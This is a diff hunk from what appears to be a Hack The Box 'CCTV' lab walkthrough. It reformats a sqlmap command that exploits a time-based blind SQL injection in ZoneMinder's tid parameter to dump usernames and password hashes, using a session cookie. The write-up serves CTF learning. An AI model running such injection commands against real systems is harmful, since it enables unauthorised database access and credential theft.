@@ -165,11 +165,10 @@ After confirming the **time-based blind SQL injection** in the `tid` parameter, 
 
 I executed the following command to extract user credentials from the ZoneMinder database:
 ```
-sqlmap -u "http://cctv.htb/zm/index.php?
-view=request&request=event&action=removetag&tid=1"
--D zm -T Users -C Username,Password --dump --batch
---dbms=MySQL --technique=T
---cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk"
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
+-D zm -T Users -C Username,Password --dump --batch \
+--dbms=MySQL --technique=T \
+--cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk" \
 --time-sec=2
 ```
 [![CCTV htb easy linux cctv.htb write up walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHt5wpF9sUp48FEYLKrr7ZAaLjdJppgg8H64bdQcIwndaZp7gc4ZeLX5x-2vjGa9RKa7844olZe0m6QCyGfM9aHCTant859QTQnPyHJjpMmYB9C1hwO5bR3yJpPMq7PwqHpblV5qErV7c2VWErB1NN53K2waSkCawaFy_SZ1eND9DE8xkRckt6O1ZS3jZc/s16000/bandicam%202026-03-09%2014-07-55-789.jpg "CCTV htb easy linux cctv.htb write up walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHt5wpF9sUp48FEYLKrr7ZAaLjdJppgg8H64bdQcIwndaZp7gc4ZeLX5x-2vjGa9RKa7844olZe0m6QCyGfM9aHCTant859QTQnPyHJjpMmYB9C1hwO5bR3yJpPMq7PwqHpblV5qErV7c2VWErB1NN53K2waSkCawaFy_SZ1eND9DE8xkRckt6O1ZS3jZc/s1833/bandicam%202026-03-09%2014-07-55-789.jpg)
